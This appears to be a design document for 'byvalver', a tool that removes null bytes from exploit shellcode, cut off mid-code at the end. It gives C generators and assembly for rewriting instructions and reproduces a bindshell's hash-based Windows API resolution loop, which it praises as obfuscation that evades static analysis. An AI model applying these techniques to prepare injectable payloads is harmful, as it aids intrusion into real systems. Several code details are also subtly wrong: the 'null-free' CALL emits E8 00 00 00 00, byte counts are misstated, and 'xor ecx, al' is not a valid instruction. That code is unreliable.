# NEW STRATEGIES FOR BYVALVER

This document contains implementable strategies extracted from real-world shellcode analysis. These strategies are organized by priority: Windows strategies first (higher detail), then Linux strategies. Each strategy provides concrete implementation guidance for eliminating null bytes.

**Last Updated**: 2025-11-19
**Shellcode Corpus Analyzed**: exploit-db shellcode collection (Windows x86/x86-64, Linux x86)
**Failing Binaries Analyzed**: EHS.bin, ouroboros_core.bin, cutyourmeat-static.bin, cheapsuit.bin

---

## Table of Contents

### Windows Strategies (Priority)
1. [Multi-Byte NOP Null-Byte Elimination](#windows-multi-byte-nop-null-byte-elimination)
2. [RIP-Relative Addressing Null-Byte Elimination (x64)](#windows-rip-relative-addressing-null-byte-elimination-x64)
3. [Large Immediate Value MOV Optimization](#windows-large-immediate-value-mov-optimization)
4. [Small Immediate Value Encoding Optimization](#windows-small-immediate-value-encoding-optimization)
5. [Relative CALL/JMP Displacement Null-Byte Handling](#windows-relative-calljmp-displacement-null-byte-handling)
6. [ROR13 Hash-Based API Resolution](#windows-ror13-hash-based-api-resolution)
7. [Custom Hash Algorithm Strategy](#windows-custom-hash-algorithm-strategy)
8. [SALC Instruction for Zero Register](#windows-salc-instruction-for-zero-register)
9. [REP STOSB for Memory Zeroing](#windows-rep-stosb-for-memory-zeroing)
10. [Stack-Based String Construction](#windows-stack-based-string-construction)
11. [Syscall Direct Invocation (x64)](#windows-syscall-direct-invocation-x64)
12. [Register Preservation via XCHG](#windows-register-preservation-via-xchg)
13. [SCASD for Position-Independent Code](#windows-scasd-for-position-independent-code)
14. [MOV Immediate via Arithmetic Decomposition](#windows-mov-immediate-via-arithmetic-decomposition)

### Linux Strategies
15. [Linux Socketcall Multiplexer Pattern](#linux-socketcall-multiplexer-pattern)
16. [Linux Push Immediate for Syscall Numbers](#linux-push-immediate-for-syscall-numbers)
17. [Linux CDQ for Zero Extension](#linux-cdq-for-zero-extension)
18. [Linux String Construction via PUSH](#linux-string-construction-via-push)

---

## WINDOWS STRATEGIES

---

## [Windows] Multi-Byte NOP Null-Byte Elimination
**Source**: EHS.bin, ouroboros_core.bin (disassembly analysis)
**Technique Category**: NOP Padding, Alignment, Code Obfuscation
**Priority**: CRITICAL (affects 100% of failing binaries with multi-byte NOPs)

### Description
Modern compilers generate multi-byte NOP instructions for code alignment, such as:
- `66 2E 0F 1F 84 00 00 00 00 00` → `nop word [cs:rax+rax+0x0]` (10 bytes, 5 nulls)
- `0F 1F 40 00` → `nop dword [rax+0x0]` (4 bytes, 1 null)
- `66 90` → `xchg ax, ax` (2 bytes, 0 nulls)

These instructions appear in compiler-generated code for padding and alignment. The longer variants contain displacement fields set to 0, which introduces null bytes.

### Implementation Approach

**Step 1: Detect Multi-Byte NOP Patterns**
```c
int can_handle_multibyte_nop(cs_insn *insn) {
    // Check for NOP instruction
    if (insn->id != X86_INS_NOP) return 0;

    // Check length - multi-byte NOPs are 2+ bytes
    if (insn->size < 2) return 0;

    // Check for null bytes in instruction encoding
    for (int i = 0; i < insn->size; i++) {
        if (insn->bytes[i] == 0x00) return 1;
    }

    return 0;
}
```

**Step 2: Strategy Selection by Replacement Size**

Strategy A: Replace with equivalent-length single-byte NOPs
```
Original: 66 2E 0F 1F 84 00 00 00 00 00 (10 bytes)
Replace:  90 90 90 90 90 90 90 90 90 90 (10 bytes, all 0x90)
```

Strategy B: Replace with null-free multi-byte NOPs
```
Original: 0F 1F 40 00 (4 bytes, "nop dword [rax+0x0]")
Replace:  66 66 90 90 (4 bytes, "xchg ax,ax; xchg ax,ax")
```

Strategy C: Replace with functional equivalents (advanced)
```
Original: 0F 1F 84 00 00 00 00 00 (8 bytes)
Replace:  48 89 C0 48 89 C0 90 90 (8 bytes, "mov rax,rax; mov rax,rax; nop; nop")
```

**Step 3: Generate Null-Free Code**
```c
void generate_null_free_nop(struct buffer *b, cs_insn *insn) {
    size_t original_size = insn->size;

    // Strategy A: Simple replacement with single-byte NOPs
    for (size_t i = 0; i < original_size; i++) {
        buffer_append_byte(b, 0x90);  // Single-byte NOP
    }
}
```

**Advanced Strategy: Size-Preserving Functional NOPs**
```c
void generate_advanced_nop(struct buffer *b, size_t size) {
    while (size > 0) {
        if (size >= 3) {
            // MOV reg, reg (2 bytes, null-free)
            buffer_append_byte(b, 0x48);  // REX.W prefix (x64)
            buffer_append_byte(b, 0x89);  // MOV
            buffer_append_byte(b, 0xC0);  // RAX, RAX
            size -= 3;
        } else if (size >= 2) {
            // XCHG AX, AX (2 bytes)
            buffer_append_byte(b, 0x66);  // Operand size override
            buffer_append_byte(b, 0x90);  // XCHG
            size -= 2;
        } else {
            // Single NOP
            buffer_append_byte(b, 0x90);
            size -= 1;
        }
    }
}
```

### Advantages
- Preserves instruction size exactly (no offset recalculation needed for surrounding code)
- Simple to implement and highly reliable
- No register side effects
- Works across all x86 and x86-64 contexts

### Considerations
- Be careful with size calculation: the generated replacement MUST be exactly the same size as the original
- Advanced strategies (mov reg,reg) may interact with optimization tools or debuggers differently than true NOPs
- Consider CPU pipeline implications: some NOP forms are faster than others on specific microarchitectures

### Test Case
```nasm
; Original (has nulls):
nop word [cs:rax+rax+0x0]  ; 66 2E 0F 1F 84 00 00 00 00 00

; Replacement (null-free):
nop                         ; 90
nop                         ; 90
nop                         ; 90
nop                         ; 90
nop                         ; 90
nop                         ; 90
nop                         ; 90
nop                         ; 90
nop                         ; 90
nop                         ; 90
```

---

## [Windows] RIP-Relative Addressing Null-Byte Elimination (x64)
**Source**: EHS.bin, cheapsuit.bin (x64 binaries)
**Technique Category**: Memory Addressing, Position-Independent Code
**Priority**: CRITICAL (affects x64 code exclusively)

### Description
In x86-64, RIP-relative addressing is the primary method for position-independent data access:
```nasm
mov rax, [rip + 0x4480]     ; 48 8B 05 80 44 00 00
```

The displacement field is a 32-bit signed value. When the offset contains null bytes (common for small offsets like 0x00004480), the instruction encoding contains nulls.

Pattern found in failing binaries:
```
488B0565440000  mov rax,[rip+0x4465]  ; Offset 0x4465 → 65 44 00 00 (2 null bytes)
488B154AAB4A00  mov rdx,[rip+0x4AAB4A] ; Large offset, no nulls
```

### Implementation Approach

**Step 1: Detect RIP-Relative Instructions with Null Offsets**
```c
int can_handle_rip_relative_null(cs_insn *insn) {
    if (insn->detail == NULL) return 0;

    cs_x86 *x86 = &insn->detail->x86;

    // Check for RIP-relative memory operand
    for (int i = 0; i < x86->op_count; i++) {
        cs_x86_op *op = &x86->operands[i];

        if (op->type == X86_OP_MEM && op->mem.base == X86_REG_RIP) {
            // Check if displacement contains null bytes
            int64_t disp = op->mem.disp;
            uint8_t bytes[4];
            memcpy(bytes, &disp, 4);

            for (int j = 0; j < 4; j++) {
                if (bytes[j] == 0x00) return 1;
            }
        }
    }

    return 0;
}
```

**Step 2: Strategy Selection**

**Strategy A: Rebase via LEA + Indirect Access**
```nasm
; Original (has nulls):
mov rax, [rip + 0x4480]     ; 48 8B 05 80 44 00 00

; Replacement (null-free):
lea rcx, [rip + 0x4480]     ; Calculate address (may still have nulls)
mov rax, [rcx]              ; Indirect load: 48 8B 01 (null-free)
```

**Issue**: LEA itself may contain null bytes in displacement. Need recursive strategy.

**Strategy B: Arithmetic Construction of Address**
```nasm
; Original:
mov rax, [rip + 0x4480]

; Replacement:
call next_instr             ; Get RIP into stack
next_instr:
pop rax                     ; RAX = current RIP
add rax, 0x44DD             ; Null-free arithmetic (adjust for offset)
sub rax, 0x5D               ; Fine-tune to exact offset
mov rax, [rax]              ; Indirect load
```

**Strategy C: Register-Relative Conversion (requires known base)**
```nasm
; If we have a base register (e.g., RBX = module base):
; Original:
mov rax, [rip + 0x4480]

; Replacement:
mov rax, [rbx + 0xNNNN]     ; Absolute offset from base, choose null-free offset
```

**Strategy D: Split Offset into Multiple Steps**
```nasm
; Original:
mov rax, [rip + 0x4480]     ; Offset has nulls

; Replacement:
lea rcx, [rip + 0x4444]     ; Null-free partial offset
add rcx, 0x3C               ; Add remainder (0x3C = 0x4480 - 0x4444)
mov rax, [rcx]              ; Indirect load
```

**Step 3: Implementation**
```c
void generate_rip_relative_null_free(struct buffer *b, cs_insn *insn) {
    cs_x86_op *mem_op = find_memory_operand(insn);
    int64_t original_disp = mem_op->mem.disp;

    // Strategy D: Split offset
    // Find null-free base offset
    int64_t base_offset = find_null_free_offset_near(original_disp);
    int64_t remainder = original_disp - base_offset;

    uint8_t dest_reg = get_destination_register(insn);
    uint8_t temp_reg = X86_REG_RCX;  // Choose unused temp register

    // LEA temp_reg, [rip + base_offset]
    buffer_append_byte(b, 0x48);     // REX.W
    buffer_append_byte(b, 0x8D);     // LEA opcode
    buffer_append_byte(b, ModRM(0, temp_reg, 5));  // ModR/M for RIP-relative
    buffer_append_dword_le(b, (uint32_t)base_offset);

    // ADD temp_reg, remainder
    if (remainder != 0) {
        generate_add_immediate(b, temp_reg, remainder);
    }

    // MOV dest_reg, [temp_reg]
    buffer_append_byte(b, 0x48);     // REX.W
    buffer_append_byte(b, 0x8B);     // MOV opcode
    buffer_append_byte(b, ModRM(0, dest_reg, temp_reg));
}
```

### Advantages
- Enables RIP-relative addressing in x64 code without null bytes
- Can handle any offset size
- Preserves position-independent code properties
- Flexible: can adapt to available registers

### Considerations
- **Register availability**: Need temporary register(s) for address calculation
- **Instruction size change**: Replacement is larger (affects jump offsets)
- **Recursive null elimination**: LEA/ADD immediates themselves must be null-free
- **Offset calculation**: Must account for instruction size changes when computing final offset
- **Performance**: Multiple instructions vs. single direct load (minimal impact)

### Edge Cases
1. **Offset is already null-free**: Skip transformation
2. **No available temporary registers**: Must spill/restore a register to stack
3. **Offset in conditional branches**: Requires careful analysis of control flow

---

## [Windows] Large Immediate Value MOV Optimization
**Source**: 13504.asm, 13514.asm (Windows bindshell samples)
**Technique Category**: Immediate Value Construction
**Priority**: HIGH

### Description
When loading 32-bit immediate values into 32-bit registers, the instruction encoding directly embeds the 4-byte value:
```nasm
mov dword [rax], 0x1        ; C7 00 01 00 00 00 (4 bytes: 01 00 00 00)
```

This encoding introduces 3 null bytes for the value 0x00000001. The pattern appears frequently in:
- Initializing flags/counters
- Setting up API parameters
- Structure member initialization

### Implementation Approach

**Step 1: Detection**
```c
int can_handle_mov_dword_immediate_null(cs_insn *insn) {
    if (insn->id != X86_INS_MOV) return 0;

    cs_x86 *x86 = &insn->detail->x86;
    if (x86->op_count != 2) return 0;

    // Check for: MOV [mem], imm32
    if (x86->operands[0].type == X86_OP_MEM &&
        x86->operands[1].type == X86_OP_IMM) {

        int64_t imm = x86->operands[1].imm;

        // Check if 32-bit immediate contains null bytes
        if ((imm & 0xFF) == 0 || ((imm >> 8) & 0xFF) == 0 ||
            ((imm >> 16) & 0xFF) == 0 || ((imm >> 24) & 0xFF) == 0) {
            return 1;
        }
    }

    return 0;
}
```

**Step 2: Strategy Selection**

**Strategy A: Byte-by-Byte Construction (for small values like 1)**
```nasm
; Original:
mov dword [rax], 0x1        ; C7 00 01 00 00 00

; Replacement:
xor ecx, ecx                ; Zero ECX: 31 C9
inc ecx                     ; ECX = 1: 41 (or FF C1)
mov [rax], ecx              ; Store: 89 08
```

**Strategy B: Register Intermediate with Sign Extension**
```nasm
; Original:
mov dword [rax], 0x1        ; Has nulls

; Replacement:
push 0x01                   ; PUSH byte: 6A 01
pop ecx                     ; POP to register: 59
mov [rax], ecx              ; Store: 89 08
```

**Strategy C: Arithmetic Construction**
```nasm
; Original:
mov dword [rax], 0x100      ; C7 00 00 01 00 00

; Replacement:
xor ecx, ecx                ; Zero ECX
mov cl, 0x01                ; CL = 1: B1 01
shl ecx, 8                  ; ECX = 0x100: C1 E1 08
mov [rax], ecx              ; Store: 89 08
```

**Strategy D: Relative to Known Value**
```nasm
; If we know [rax] already contains some value V:
; Original:
mov dword [rax], 0x1

; Replacement (if V is close to 1):
add dword [rax], (0x1 - V)  ; Arithmetic adjustment
```

**Step 3: Size Calculation**
```c
size_t get_size_mov_dword_immediate(cs_insn *insn) {
    int64_t imm = get_immediate_operand_value(insn);

    if (imm <= 0xFF && is_null_free_byte(imm)) {
        // Strategy B: push byte + pop + mov
        return 1 + 1 + 2;  // 4 bytes
    } else if (imm == 1) {
        // Strategy A: xor + inc + mov
        return 2 + 1 + 2;  // 5 bytes (optimized with FF C1 for inc)
    } else {
        // Strategy C: arithmetic construction
        return calculate_arithmetic_construction_size(imm);
    }
}
```

**Step 4: Generation**
```c
void generate_mov_dword_immediate_null_free(struct buffer *b, cs_insn *insn) {
    cs_x86_op *mem_op = &insn->detail->x86.operands[0];
    int64_t imm = insn->detail->x86.operands[1].imm;

    uint8_t temp_reg = X86_REG_ECX;  // Choose temp register

    if (imm == 1) {
        // XOR ecx, ecx
        buffer_append_byte(b, 0x31);
        buffer_append_byte(b, 0xC9);

        // INC ecx (use FF C1 to avoid 0x41 encoding which may conflict)
        buffer_append_byte(b, 0xFF);
        buffer_append_byte(b, 0xC1);
    } else if (imm <= 0xFF && is_null_free_byte(imm)) {
        // PUSH byte
        buffer_append_byte(b, 0x6A);
        buffer_append_byte(b, (uint8_t)imm);

        // POP ecx
        buffer_append_byte(b, 0x59);
    } else {
        // Arithmetic construction (implementation depends on value)
        construct_value_arithmetic(b, temp_reg, imm);
    }

    // MOV [mem], temp_reg
    generate_mov_to_memory(b, mem_op, temp_reg);
}
```

### Advantages
- Eliminates null bytes from immediate value encodings
- Works for any immediate value
- Can optimize for common values (0, 1, -1)
- Flexible strategy selection based on value characteristics

### Considerations
- **Register availability**: Need temporary register
- **Size increase**: Replacement is typically 3-6 bytes vs. original 6 bytes
- **Flag effects**: XOR/INC operations affect flags; ensure this doesn't break conditional logic
- **Optimization opportunities**: Reuse registers already containing useful values

### Test Case
```nasm
; Original:
mov dword [rax], 0x1        ; C7 00 01 00 00 00

; Replacement:
xor ecx, ecx                ; 31 C9
inc ecx                     ; FF C1
mov [rax], ecx              ; 89 08
```

---

## [Windows] Small Immediate Value Encoding Optimization
**Source**: 13504.asm (line 74: MOV CH, 0x3)
**Technique Category**: Immediate Value Encoding, Register Manipulation
**Priority**: HIGH

### Description
The shellcode uses a clever technique to construct 0x300 without null bytes:
```nasm
MOV CH, 0x3         ; Sets CH (high byte of CX) to 3, result: ECX = 0x300
```

This is more compact than:
```nasm
MOV ECX, 0x300      ; Would encode as B9 00 03 00 00 (contains nulls)
```

The pattern exploits x86 register structure where 8-bit, 16-bit, and 32-bit portions overlap:
- AX = AH:AL (16-bit)
- EAX = upper16:AX (32-bit)

### Implementation Approach

**Step 1: Identify Opportunities**
```c
int can_optimize_to_high_byte_load(cs_insn *insn) {
    if (insn->id != X86_INS_MOV) return 0;

    cs_x86 *x86 = &insn->detail->x86;
    if (x86->op_count != 2) return 0;

    // Check: MOV reg32, imm32 where imm has pattern 0x0000XX00
    if (x86->operands[0].type == X86_OP_REG &&
        x86->operands[1].type == X86_OP_IMM) {

        int64_t imm = x86->operands[1].imm;

        // Check if value fits pattern: 0x0000XX00 (byte in bit position 8-15)
        if ((imm & 0xFFFF00FF) == 0 && ((imm >> 8) & 0xFF) != 0) {
            return 1;
        }
    }

    return 0;
}
```

**Step 2: Register Mapping**
```c
uint8_t get_high_byte_register(uint8_t reg32) {
    switch (reg32) {
        case X86_REG_EAX: return X86_REG_AH;
        case X86_REG_EBX: return X86_REG_BH;
        case X86_REG_ECX: return X86_REG_CH;
        case X86_REG_EDX: return X86_REG_DH;
        default: return 0;  // No high-byte register available
    }
}
```

**Step 3: Generate Optimized Code**
```c
void generate_high_byte_mov(struct buffer *b, cs_insn *insn) {
    uint8_t reg32 = insn->detail->x86.operands[0].reg;
    int64_t imm = insn->detail->x86.operands[1].imm;

    uint8_t byte_value = (imm >> 8) & 0xFF;
    uint8_t high_byte_reg = get_high_byte_register(reg32);

    if (high_byte_reg == 0) {
        // Fallback: can't use high-byte register for this reg
        generate_alternative_strategy(b, insn);
        return;
    }

    // MOV high_byte_reg, immediate
    // Encoding: B4+r ib (for AH, BH, CH, DH)
    buffer_append_byte(b, 0xB4 + (high_byte_reg - X86_REG_AH));
    buffer_append_byte(b, byte_value);
}
```

**Step 4: Extend Pattern for Other Byte Positions**

**Pattern 0x00XX0000** (bits 16-23):
```nasm
; Original:
mov eax, 0x10000        ; Contains nulls

; Replacement (x86-64):
xor eax, eax            ; Clear EAX
mov ah, 0x01            ; AH = 1
shl eax, 8              ; EAX = 0x10000
```

**Pattern 0xXX000000** (bits 24-31):
```nasm
; Original:
mov eax, 0x8000000      ; Contains nulls

; Replacement:
mov al, 0x08            ; AL = 8
shl eax, 24             ; EAX = 0x8000000
```

### Implementation in byvalver
```c
void generate_pattern_based_immediate(struct buffer *b, uint8_t reg, uint32_t value) {
    // Check which byte is non-zero
    if ((value & 0xFF) != 0 && (value & 0xFFFFFF00) == 0) {
        // Low byte only: MOV reg_low, byte
        buffer_append_byte(b, 0xB0 + get_low_byte_reg(reg));
        buffer_append_byte(b, value & 0xFF);

    } else if ((value & 0xFF00) != 0 && (value & 0xFFFF00FF) == 0) {
        // High byte only: MOV reg_high, byte
        uint8_t high_reg = get_high_byte_register(reg);
        buffer_append_byte(b, 0xB4 + (high_reg - X86_REG_AH));
        buffer_append_byte(b, (value >> 8) & 0xFF);

    } else if ((value & 0xFF0000) != 0 && (value & 0xFF00FFFF) == 0) {
        // Bits 16-23: XOR + MOV high byte + SHL
        generate_xor_reg_reg(b, reg, reg);
        uint8_t high_reg = get_high_byte_register(reg);
        buffer_append_byte(b, 0xB4 + (high_reg - X86_REG_AH));
        buffer_append_byte(b, (value >> 16) & 0xFF);
        generate_shl_immediate(b, reg, 8);

    } else if ((value & 0xFF000000) != 0 && (value & 0x00FFFFFF) == 0) {
        // Bits 24-31: MOV low byte + SHL 24
        buffer_append_byte(b, 0xB0 + get_low_byte_reg(reg));
        buffer_append_byte(b, (value >> 24) & 0xFF);
        generate_shl_immediate(b, reg, 24);
    }
}
```

### Advantages
- Extremely compact encoding (2 bytes vs. 5-6 bytes)
- No null bytes for values like 0x100, 0x200, ..., 0xFF00
- Leverages x86 register structure
- No additional register needed

### Considerations
- **Limited applicability**: Only works for specific value patterns (single non-zero byte)
- **Register restrictions**: High-byte registers (AH, BH, CH, DH) only available for EAX, EBX, ECX, EDX
- **x86-64 considerations**: High-byte registers cannot be used with REX prefix; must be careful in 64-bit code
- **Flag preservation**: Shift operations affect flags

### Test Case
```nasm
; Original:
mov ecx, 0x300          ; B9 00 03 00 00

; Optimized:
mov ch, 0x3             ; B5 03
```

---

## [Windows] Relative CALL/JMP Displacement Null-Byte Handling
**Source**: EHS.bin, cheapsuit.bin (analyzed patterns)
**Technique Category**: Control Flow, Branch Transformation
**Priority**: CRITICAL

### Description
Relative CALL and JMP instructions encode the target as a signed displacement from the end of the instruction:
```nasm
call 0x2208             ; E8 03 22 00 00 (displacement: 0x2203, but becomes 0x00002203 in little-endian)
jnz 0x67                ; 75 0F (short jump, displacement: 0x0F)
```

When the displacement contains null bytes (common for jumps > 255 bytes forward), the instruction encoding has nulls.

Patterns in failing binaries:
```
E884210000  call +0x2184    ; Null bytes in displacement
0F8652050000 jbe +0x552      ; Long conditional jump with nulls
```

### Implementation Approach

**Step 1: Detect Problematic Jumps/Calls**
```c
int can_handle_relative_jump_null(cs_insn *insn) {
    // Check if it's a control flow instruction
    if (insn->id != X86_INS_CALL && insn->id != X86_INS_JMP &&
        !is_conditional_jump(insn)) {
        return 0;
    }

    // Check for relative addressing (not register indirect)
    if (insn->detail->x86.operands[0].type != X86_OP_IMM) {
        return 0;
    }

    // Calculate displacement
    int64_t target = insn->detail->x86.operands[0].imm;
    int64_t current_addr = insn->address;
    int64_t displacement = target - (current_addr + insn->size);

    // Check for null bytes in displacement encoding
    uint8_t bytes[4];
    memcpy(bytes, &displacement, 4);

    for (int i = 0; i < 4; i++) {
        if (bytes[i] == 0x00) return 1;
    }

    return 0;
}
```

**Step 2: Strategy Selection**

**Strategy A: Short Jump → Long Jump Conversion**
```nasm
; If a short jump (EB rel8) could be made longer without nulls:
; Original:
jmp 0x50                ; EB 50 (short jump, null-free)

; If this becomes:
jmp 0x100               ; EB 00 (would have null if using short form)

; Convert to:
jmp 0x100               ; E9 FB 00 00 00 (long form, may still have nulls)
```

**Issue**: Long form may introduce more nulls. Need different strategy.

**Strategy B: Indirect Jump via Register**
```nasm
; Original:
call 0x2208             ; E8 03 22 00 00

; Replacement:
call get_eip            ; Get current EIP
get_eip:
pop eax                 ; EAX = current position
add eax, 0x220D         ; Calculate target (null-free offset)
sub eax, 0x05           ; Adjust for instruction size
call eax                ; Indirect call
```

**Strategy C: Trampoline Jump Chain**
```nasm
; Original:
jnz 0x100               ; 0F 85 FA 00 00 00 (6 bytes, has nulls)

; Replacement (two hops):
jnz trampoline          ; 75 XX (short jump to trampoline)
...
trampoline:
jmp 0x100               ; E9 YY YY YY YY (choose YY to be null-free)
```

**Strategy D: Negate Condition + Short Jump**
```nasm
; Original:
jnz far_target          ; Long jump with nulls

; Replacement:
jz skip                 ; Invert condition, short jump
jmp far_target          ; Unconditional jump (can be made null-free)
skip:
```

**Step 3: Implementation**
```c
void generate_null_free_call(struct buffer *b, cs_insn *insn) {
    int64_t target_addr = insn->detail->x86.operands[0].imm;
    int64_t current_addr = insn->address;

    // Strategy B: Indirect call
    // CALL next_instr
    buffer_append_byte(b, 0xE8);
    buffer_append_dword_le(b, 0x00000000);  // Displacement = 0 (calls next instruction)

    // POP EAX (get return address = next instruction)
    buffer_append_byte(b, 0x58);

    // Calculate null-free offset
    int64_t offset = target_addr - (current_addr + get_size_null_free_call(insn));
    int64_t base_offset, remainder;
    split_into_null_free_parts(offset, &base_offset, &remainder);

    // ADD EAX, base_offset
    buffer_append_byte(b, 0x05);
    buffer_append_dword_le(b, base_offset);

    // SUB EAX, -remainder (if remainder negative, use ADD)
    if (remainder != 0) {
        buffer_append_byte(b, 0x2D);
        buffer_append_dword_le(b, -remainder);
    }

    // CALL EAX
    buffer_append_byte(b, 0xFF);
    buffer_append_byte(b, 0xD0);
}
```

**For Conditional Jumps:**
```c
void generate_null_free_conditional_jump(struct buffer *b, cs_insn *insn) {
    int64_t target_addr = insn->detail->x86.operands[0].imm;
    int64_t displacement = target_addr - (insn->address + 2);  // Short jump size

    // Check if short jump would be null-free
    if (displacement >= -128 && displacement <= 127 && !has_null_byte((uint8_t)displacement)) {
        // Use short jump form
        uint8_t short_opcode = get_short_jump_opcode(insn->id);
        buffer_append_byte(b, short_opcode);
        buffer_append_byte(b, (uint8_t)displacement);
    } else {
        // Strategy D: Negate condition + short jump over unconditional jump
        uint8_t inverted_opcode = get_inverted_jump_opcode(insn->id);

        // JCC skip (short jump, 2 bytes)
        buffer_append_byte(b, inverted_opcode);
        buffer_append_byte(b, 0x05);  // Skip 5 bytes (size of JMP instruction below)

        // JMP target (null-free encoding via Strategy B if needed)
        generate_null_free_unconditional_jump(b, target_addr);

        // skip:
    }
}
```

### Advantages
- Handles any displacement distance
- Provides multiple fallback strategies
- Can be optimized based on displacement size
- Preserves control flow semantics

### Considerations
- **Instruction size change**: Dramatically increases code size (5 bytes → 15+ bytes)
- **Offset recalculation**: All subsequent jumps/calls must be recalculated
- **Register availability**: Strategy B requires temporary register
- **Stack effects**: CALL/POP strategy modifies stack temporarily
- **Performance**: Indirect jumps may be slower due to branch prediction
- **Conditional jump limits**: May need creative solutions for long conditional jumps

### Edge Cases
1. **Backward jumps**: Displacement is negative, different null-byte patterns
2. **Jump tables**: Indirect jumps to computed targets (different handling)
3. **Self-modifying code**: If target address is computed at runtime

---

## [Windows] ROR13 Hash-Based API Resolution
**Source**: 13504.asm (Windows bindshell, lines 117-127)
**Technique Category**: Dynamic Linking, API Resolution
**Priority**: HIGH (foundation for null-free Windows shellcode)

### Description
ROR13 is a popular hash algorithm for API name resolution. Instead of storing function names as strings (which contain nulls at termination), shellcode stores 4-byte hash values and dynamically resolves APIs by:
1. Walking the export table of a DLL
2. Hashing each exported function name
3. Comparing the hash to the target hash

The hash algorithm from 13504.asm:
```nasm
hash_loop:
    LODSB                               ; Load character: AL = *ESI++
    XOR     AL, hash_xor_value          ; XOR with constant (0x71)
    SUB     AH, AL                      ; Accumulate: AH -= AL
    CMP     AL, hash_xor_value          ; Check for null terminator
    JNE     hash_loop                   ; Continue if not null
```

This is a variant that XORs each byte with 0x71 before accumulating, making null detection unique.

### Implementation Approach

**Step 1: Implement Hash Calculation in C**
```c
uint8_t calculate_ror13_xor_hash(const char *function_name, uint8_t xor_value, uint8_t start_value) {
    uint8_t hash_high = start_value;  // Start value for AH

    for (const char *p = function_name; *p != '\0'; p++) {
        uint8_t ch = *p;
        ch ^= xor_value;              // XOR with constant
        hash_high -= ch;              // SUB AH, AL
    }

    return hash_high;
}
```

**Standard ROR13 Hash** (for comparison):
```c
uint32_t calculate_ror13_hash(const char *function_name) {
    uint32_t hash = 0;

    for (const char *p = function_name; *p != '\0'; p++) {
        hash = (hash >> 13) | (hash << (32 - 13));  // ROR 13
        hash += (uint32_t)(*p);
    }

    return hash;
}
```

**Step 2: Generate Hash Table in Shellcode**
```c
void generate_api_hash_table(struct buffer *b, const char **api_names, size_t count) {
    for (size_t i = 0; i < count; i++) {
        uint8_t hash = calculate_ror13_xor_hash(api_names[i], 0x71, 0x36);

        // Verify hash is null-free
        if (hash == 0x00) {
            fprintf(stderr, "Warning: Hash for %s is 0x00, adjust algorithm\n", api_names[i]);
        }

        buffer_append_byte(b, hash);
    }
}
```

**Step 3: Generate Hash Resolution Loop**
```nasm
; Hash table structure (from 13504.asm):
; PUSH B2DW(hash_CreateProcessA, hash_LoadLibraryA, hash_WSAStartup, hash_WSASocketA)
; PUSH B2DW(hash_bind, hash_listen, hash_accept, 's')  ; 's' is marker

hash_resolution_loop:
    MOVSB                               ; [EDI] = hash from table
    DEC     EDI                         ; Restore EDI

    ; Get PE export table
    MOV     EBX, [EBP + 0x3C]           ; EBX = PE header offset
    MOV     EBX, [EBP + EBX + 0x78]     ; EBX = Export table RVA
    ADD     EBX, EBP                    ; EBX = Export table VA
    MOV     ECX, [EBX + 0x20]           ; ECX = Names table RVA
    ADD     ECX, EBP                    ; ECX = Names table VA

    XOR     EDX, EDX                    ; EDX = function index

next_function:
    INC     EDX                         ; Next function
    MOV     ESI, [ECX + EDX * 4]        ; ESI = function name RVA
    ADD     ESI, EBP                    ; ESI = function name VA
    MOV     AH, hash_start_value        ; Initialize hash

hash_loop:
    LODSB                               ; AL = next character
    XOR     AL, hash_xor_value          ; XOR character
    SUB     AH, AL                      ; Accumulate hash
    CMP     AL, hash_xor_value          ; Null terminator?
    JNE     hash_loop                   ; Continue hashing

    CMP     AH, [EDI]                   ; Compare hash
    JNZ     next_function               ; Try next function

    ; Found! Resolve address
    MOV     ECX, [EBX + 0x24]           ; Ordinals table RVA
    ADD     ECX, EBP                    ; Ordinals table VA
    MOVZX   EDX, WORD [ECX + 2 * EDX]   ; Get ordinal
    MOV     ECX, [EBX + 0x1C]           ; Address table RVA
    ADD     ECX, EBP                    ; Address table VA
    MOV     EAX, EBP                    ; Base address
    ADD     EAX, [ECX + 4 * EDX]        ; Function address
    STOSD                               ; Store in proc table
```

**Step 4: Integration with byvalver**

byvalver should recognize and preserve this pattern:
```c
int is_hash_resolution_sequence(cs_insn *insn, size_t count) {
    // Pattern: LODSB + XOR + SUB + CMP + JNE loop
    // This is a complex pattern that should be preserved as-is
    // Only transform if individual instructions have nulls

    return detect_specific_instruction_sequence(insn, count, HASH_LOOP_PATTERN);
}
```

### Advantages
- **Null-free**: Hash values are carefully chosen to avoid 0x00 bytes
- **Compact**: 1-4 bytes per function vs. full name strings
- **Version-independent**: Works across Windows versions (as long as API exists)
- **Obfuscation**: Hides API usage from basic static analysis

### Considerations
- **Hash collisions**: Ensure each hash is unique within the target DLL
- **Algorithm choice**: XOR-based variant differs from standard ROR13
- **Start/XOR values**: Tunable parameters (0x36, 0x71) affect hash distribution
- **Marker byte**: End-of-table marker ('s' in this case) must not collide with hashes
- **Module base**: Requires PEB walking to find kernel32.dll base first

### Test Implementation
```c
// Test hash calculation
void test_hash_calculation(void) {
    const char *apis[] = {
        "CreateProcessA",
        "LoadLibraryA",
        "WSAStartup",
        "WSASocketA",
        "bind",
        "listen",
        "accept"
    };

    for (int i = 0; i < 7; i++) {
        uint8_t hash = calculate_ror13_xor_hash(apis[i], 0x71, 0x36);
        printf("%s: 0x%02X\n", apis[i], hash);
    }
}

// Expected output (from 13504.asm):
// CreateProcessA: 0xB7
// LoadLibraryA: 0x8F
// WSAStartup: 0x09
// WSASocketA: 0x98
// bind: 0x66
// listen: 0x56
// accept: 0x77
```

### Integration Strategy for byvalver
1. **Detection**: Recognize hash loop patterns via sequence matching
2. **Preservation**: Mark hash loop instructions as "sequence" (don't transform individually)
3. **Null elimination**: Only apply if loop body contains null bytes (rare)
4. **Documentation**: Add comments to generated code indicating hash algorithm used

---

## [Windows] Custom Hash Algorithm Strategy
**Source**: 13514.asm (lines 66-73)
**Technique Category**: API Resolution, Hash Algorithm Design
**Priority**: MEDIUM (alternative to ROR13)

### Description
The 13514.asm sample uses a different hash algorithm based on ROL (rotate left):
```nasm
GetImportHashLoop:
    xor   ecx, al           ; XOR accumulator with character
    rol   ecx, 5            ; Rotate left 5 bits
    lodsb                   ; Load next character
    test  al, al            ; Check for null terminator
    jnz   GetImportHashLoop
```

This produces 32-bit hashes, offering:
- Larger hash space (reduced collision probability)
- Different hash values than ROR13 (makes detection harder)
- Tunable rotation amount (ROL 5 in this case)

### Implementation Approach

**Step 1: Implement ROL5 Hash**
```c
uint32_t calculate_rol5_hash(const char *function_name) {
    uint32_t hash = 0;

    for (const char *p = function_name; *p != '\0'; p++) {
        hash ^= (uint32_t)(*p);               // XOR with character
